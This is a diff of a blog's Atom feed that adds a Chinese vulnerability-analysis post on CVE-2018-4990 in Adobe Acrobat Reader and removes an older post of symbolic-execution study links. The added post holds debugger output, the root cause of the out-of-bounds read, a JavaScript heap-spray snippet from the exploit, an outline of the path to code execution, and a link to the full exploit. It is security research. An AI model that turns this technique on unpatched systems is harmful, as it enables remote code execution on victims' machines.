@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://o0xmuhe.me/"/>
-  <updated>2019-04-06T13:31:14.446Z</updated>
+  <updated>2019-04-06T13:50:29.123Z</updated>
   <id>http://o0xmuhe.me/</id>
   
   <author>
@@ -14,6 +14,57 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CVE-2018-4990 analysis</title>
+    <link href="http://o0xmuhe.me/2019/04/06/CVE-2018-4990-analysis/"/>
+    <id>http://o0xmuhe.me/2019/04/06/CVE-2018-4990-analysis/</id>
+    <published>2019-04-06T13:39:01.000Z</published>
+    <updated>2019-04-06T13:50:29.123Z</updated>
+    
+    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jp2k的越界读，转换2-free的利用。</span><br></pre></td></tr></table></figure>
+<h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><p>Win7 x86<br>Adobe Acrobat Reader 2018.011.20036</p>
+<a id="more"></a>
+<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>一张特殊构造过的JP2K图片<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15542914054830.jpg" alt="-w650"></p>
+<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15542914250745.jpg" alt="-w640"></p>
+<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15542914374768.jpg" alt="-w641"></p>
+<p>大小和内容都是经过构造的，这里先触发一下漏洞，分析漏洞成因。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>打开pageheap后，windbg调试。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; r</span><br><span class="line">eax=00000000 ebx=00000000 ecx=6bf58598 edx=00000000 esi=00000000 edi=00000000</span><br><span class="line">eip=6bf2ba58 esp=00529b04 ebp=00529b20 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">verifier!VerifierStopMessage+0x1f8:</span><br><span class="line">6bf2ba58 cc              int     3</span><br><span class="line">0:000&gt; k10</span><br><span class="line">ChildEBP RetAddr  </span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line">00529b20 6bf29ee0 verifier!VerifierStopMessage+0x1f8</span><br><span class="line">00529b84 6bf26f11 verifier!VerifierDisableFaultInjectionExclusionRange+0x3f90</span><br><span class="line">0052a16c 6bf26f95 verifier!VerifierDisableFaultInjectionExclusionRange+0xfc1</span><br><span class="line">0052a190 6bf27240 verifier!VerifierDisableFaultInjectionExclusionRange+0x1045</span><br><span class="line">0052a1ac 6bf29080 verifier!VerifierDisableFaultInjectionExclusionRange+0x12f0</span><br><span class="line">0052a1c8 776b65f4 verifier!VerifierDisableFaultInjectionExclusionRange+0x3130</span><br><span class="line">0052a210 7767a0aa ntdll!RtlpNtMakeTemporaryKey+0x48b5</span><br><span class="line">0052a304 776465a6 ntdll!EtwSetMark+0xe743</span><br><span class="line">0052a324 7733c3d4 ntdll!wcsnicmp+0xcaa</span><br><span class="line">0052a338 69feecfa kernel32!HeapFree+0x14</span><br><span class="line">0052a34c 64290574 MSVCR120!free+0x1a</span><br><span class="line">0052a46c 642a6482 JP2KLib!JP2KCopyRect+0xbae6</span><br><span class="line">0052a4c4 65f06a24 JP2KLib!JP2KImageInitDecoderEx+0x24</span><br><span class="line">0052a54c 65f083be AcroRd32_65910000!AX_PDXlateToHostEx+0x2615e5</span><br><span class="line">0052a5ac 65efd459 AcroRd32_65910000!AX_PDXlateToHostEx+0x262f7f</span><br><span class="line">0052a5b8 65f06368 AcroRd32_65910000!AX_PDXlateToHostEx+0x25801a</span><br></pre></td></tr></table></figure>
+<p>根据call stack往前找，找漏洞触发的点，着重分析JP2KLib中两个调用。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">JP2KImageInitDecoderEx</span><span class="params">(Concurrency::details::SchedulerBase *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_1004F3BD(a2, a3, a4, a5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15543015735567.jpg" alt="-w848"></p>
+<p>对应的汇编<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15543020367641.jpg" alt="-w375"></p>
+<p>调试一下这里：<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15543023168418.jpg" alt="-w1485"></p>
+<p>可以发现，这个循环，每次读取8字节，循环次数<code>0xff</code>次。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> idx = <span class="number">0</span>; idx &lt; <span class="number">0xff</span>; idx++)&#123;</span><br><span class="line">    <span class="comment">//do read work...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后一次循环的时候，idx是<code>0xfe</code>，此时读取到 <code>0xfe * 4</code>。<br>调试发现，<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15543026333699.jpg" alt="-w426"></p>
+<p>这个buffer size只有<code>0xfd * 4 = 0x3f4</code>这么大，所以导致越界读的发生。</p>
+<h2 id="Exploit-分析"><a href="#Exploit-分析" class="headerlink" title="Exploit 分析"></a>Exploit 分析</h2><p>这个利用可以说十分的巧妙，利用js布局内存，把越界读转换成了<code>Double free</code>完成利用。</p>
+<p><a href="https://github.com/o0xmuhe/RealWorldPwn/tree/master/CVE-2018-4990" target="_blank" rel="noopener">完整Exploit链接</a></p>
+<p>因为需要提前做内存布局，不能直接就触发漏洞，所以需要利用js再布局内存完成后，主动地触发漏洞，这里的做法和p2o 2017，360安全团队打Reader的利用套路一样，把图片放嵌入<code>button field</code>,并设置按钮不可显示，在布局完成后，设置按钮属性可显，然后触发漏洞。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a         = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x3000</span>);</span><br><span class="line"><span class="keyword">var</span> spraynum  = <span class="number">0x1000</span>;</span><br><span class="line"><span class="keyword">var</span> sprayarr  = <span class="keyword">new</span> <span class="built_in">Array</span>(spraynum);</span><br><span class="line"><span class="keyword">var</span> spraylen  = <span class="number">0x10000</span><span class="number">-24</span>;</span><br><span class="line"><span class="keyword">var</span> spraybase = <span class="number">0x0d0e0048</span>;</span><br><span class="line"><span class="keyword">var</span> spraypos  = <span class="number">0x0d0f0058</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// force allocations to prepare the heap for the oob read</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i1 = <span class="number">1</span>; i1 &lt; <span class="number">0x3000</span>; i1++)&#123;</span><br><span class="line">    a[i1] = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">252</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// these will be freed</span></span><br><span class="line">    a[i1][<span class="number">249</span>] = spraybase;</span><br><span class="line">    a[i1][<span class="number">250</span>] = spraybase + <span class="number">0x10000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// heap spray to land ArrayBuffers at 0x0d0e0048 and 0x0d0f0048</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i1 = <span class="number">1</span>; i1 &lt; spraynum; i1++)&#123;</span><br><span class="line">    sprayarr[i1] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(spraylen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// make holes so the oob read chunk lands here</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i1 = <span class="number">1</span>; i1 &lt; <span class="number">0x3000</span>; i1 = i1 + <span class="number">2</span>)&#123;</span><br><span class="line">    <span class="keyword">delete</span> a[i1];</span><br><span class="line">    a[i1] = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>内存布局的话，利用中使用了ArrayBuffer，利用堆喷，分配大量连续的Arraybuffer，并<code>make hole</code>，使得图片解析的时候正好分配到内存布局的<code>hole</code>;随后触发越界读，把漏洞转换成double free去利用。</p>
+<p>​    利用的后面通过sprayarr2的赋值抢占释放的0x20000内存，一旦抢占成功，sprayarr中之前被释放的elment的长度就会被修改为0x20000；最后通过之前内存布局后精准的内存释放(idx 249,250)获取一个超长element，以实现全局内存读写，再通过全局内存读写，伪造bookmarkRoot的对象实现任意代码执行。</p>
+<h2 id="历史遗留问题"><a href="#历史遗留问题" class="headerlink" title="历史遗留问题"></a>历史遗留问题</h2><p>win7上这些分析没啥问题，一步步调试，内存布局也没什么问题；在win10上内存布局出现了不连续、失效等情况，这部分<code>TODO</code>，需要解决。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://srcincite.io/blog/2018/05/21/adobe-me-and-a-double-free.html" target="_blank" rel="noopener">adobe-me-and-a-double-free</a></p>
+<p><a href="https://bbs.pediy.com/thread-250449.htm" target="_blank" rel="noopener">对CVE-2018-4990漏洞的补充分析</a></p>
+<p><a href="https://ti.360.net/blog/articles/analysis-of-cve-2018-4990/" target="_blank" rel="noopener"><strong>CVE-2018-4990 Adobe Reader 代码执行漏洞利用分析</strong></a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;jp2k的越界读，转换2-free的利用。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&quot;环境信息&quot;&gt;&lt;a href=&quot;#环境信息&quot; class=&quot;headerlink&quot; title=&quot;环境信息&quot;&gt;&lt;/a&gt;环境信息&lt;/h2&gt;&lt;p&gt;Win7 x86&lt;br&gt;Adobe Acrobat Reader 2018.011.20036&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="漏洞分析" scheme="http://o0xmuhe.me/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="Adobe Acrobat Reader" scheme="http://o0xmuhe.me/tags/Adobe-Acrobat-Reader/"/>
+    
+  </entry>
   
   <entry>
     <title>CVE-2016-4622  analysis</title>
@@ -817,56 +868,6 @@
     
     </summary>
     
-    
-  </entry>
-  
-  <entry>
-    <title>Symbolic Execution学习</title>
-    <link href="http://o0xmuhe.me/2018/02/16/Symbolic-Execution%E5%AD%A6%E4%B9%A0/"/>
-    <id>http://o0xmuhe.me/2018/02/16/Symbolic-Execution学习/</id>
-    <published>2018-02-16T09:36:48.000Z</published>
-    <updated>2018-12-20T06:08:17.000Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00: 前言"></a>0x00: 前言</h4><p>学习的时候做个记录，看过什么，踩过什么坑之类的。</p>
-<a id="more"></a>
-<h4 id="0x01-资料"><a href="#0x01-资料" class="headerlink" title="0x01: 资料"></a>0x01: 资料</h4><h5 id="1-paper-amp-amp-不错的文章"><a href="#1-paper-amp-amp-不错的文章" class="headerlink" title="1. paper &amp;&amp; 不错的文章"></a>1. paper &amp;&amp; 不错的文章</h5><p>《All You Ever Wanted to Know about Dynamic Taint Analysis and Forward Symbolic Execution (but Might Have Been Afraid to Ask)》</p>
-<p>《Symbolic execution for software testing: three decades later》</p>
-<p><a href="https://zhuanlan.zhihu.com/p/26927127" target="_blank" rel="noopener">符号执行入门</a></p>
-<h5 id="2-项目"><a href="#2-项目" class="headerlink" title="2. 项目"></a>2. 项目</h5><p><a href="https://github.com/chyyuu/symexe/blob/master/klee_document/klee_analysis.md" target="_blank" rel="noopener">KLEE</a></p>
-<p><a href="https://github.com/Z3Prover/z3" target="_blank" rel="noopener">Z3</a></p>
-<p><a href="https://github.com/angr" target="_blank" rel="noopener">Angr</a></p>
-<h4 id="3-一些资源"><a href="#3-一些资源" class="headerlink" title="3. 一些资源"></a>3. 一些资源</h4><h5 id="3-1-z3"><a href="#3-1-z3" class="headerlink" title="3.1 z3"></a>3.1 z3</h5><p>主要是解决一些CTF题目。</p>
-<ol>
-<li><p><a href="https://zhuanlan.zhihu.com/p/30548907" target="_blank" rel="noopener">Z3一把梭：用约束求解搞定一类CTF题</a></p>
-</li>
-<li><p><a href="https://blog.csdn.net/s1054436218/article/details/78651075" target="_blank" rel="noopener">使用z3约束器解决CTF中的题目</a></p>
-</li>
-<li><p><a href="https://github.com/sam-b/z3-stuff/blob/master/a-bug-hunters-constraint-solver/README.md?1524556640719" target="_blank" rel="noopener">z3-stuf</a></p>
-</li>
-</ol>
-<h5 id="3-2-angr"><a href="#3-2-angr" class="headerlink" title="3.2 angr"></a>3.2 angr</h5><ol>
-<li><p><a href="https://github.com/angr/angr-doc" target="_blank" rel="noopener">angr-doc</a></p>
-<p> 使用angr解决一些ctf题目，这部分直接参考angr-doc里的examples就好了。</p>
-</li>
-<li><p><a href="https://github.com/jakespringer/angr_ctf" target="_blank" rel="noopener">angr-ctf</a></p>
-<p> 很好的入门资料，各种基础用法都有demo，注释很全面，跟着学习就好了。<br> 环境建议：Linux + virtualenv</p>
-</li>
-<li><p>关注各大ctf中wp</p>
-</li>
-</ol>
-<h5 id="4-实践demo"><a href="#4-实践demo" class="headerlink" title="4. 实践demo"></a>4. 实践demo</h5><h5 id="1-mini-mc"><a href="#1-mini-mc" class="headerlink" title="1. mini mc"></a>1. <a href="https://github.com/xiw/mini-mc" target="_blank" rel="noopener">mini mc</a></h5><p>This directory contains a “minimal” implementation to demonstrate<br>the basic ideas of symbolic execution and concolic execution, using<br>Z3’s Python interface. </p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h4 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00: 前言&quot;&gt;&lt;/a&gt;0x00: 前言&lt;/h4&gt;&lt;p&gt;学习的时候做个记录，看过什么，踩过什么坑之类的。&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="Study" scheme="http://o0xmuhe.me/tags/Study/"/>
-    
-      <category term="Symbolic Execution" scheme="http://o0xmuhe.me/tags/Symbolic-Execution/"/>
     
   </entry>
   
